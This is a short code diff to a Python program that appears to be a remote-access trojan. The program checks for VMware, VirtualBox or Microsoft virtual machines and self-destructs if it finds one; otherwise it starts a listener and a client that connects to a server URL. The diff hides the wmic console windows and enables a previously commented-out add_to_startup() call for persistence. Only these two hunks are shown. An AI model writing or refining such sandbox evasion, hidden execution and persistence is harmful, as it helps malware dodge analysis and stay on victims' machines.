@@ -33,7 +33,7 @@ def check_vm():
         wmic_commands = [("bios", "get", "manufacturer"), ("computersystem", "get", "model")]
         for command in wmic_commands:
             try:
-                result = subprocess.check_output(["wmic"] + list(command), text=True)
+                result = subprocess.check_output(["wmic"] + list(command), text=True, creationflags=subprocess.CREATE_NO_WINDOW, stderr=subprocess.PIPE)
                 if any(vm in result.lower() for vm in ["vmware", "virtualbox", "microsoft corporation"]):
                     return True
             except subprocess.CalledProcessError:
@@ -90,7 +90,7 @@ def main():
     if check_vm():
         self_destruction()
     else:
-        # add_to_startup()
+        add_to_startup()
         threading.Thread(target=start_listener).start()
         start_client(server_url)
 
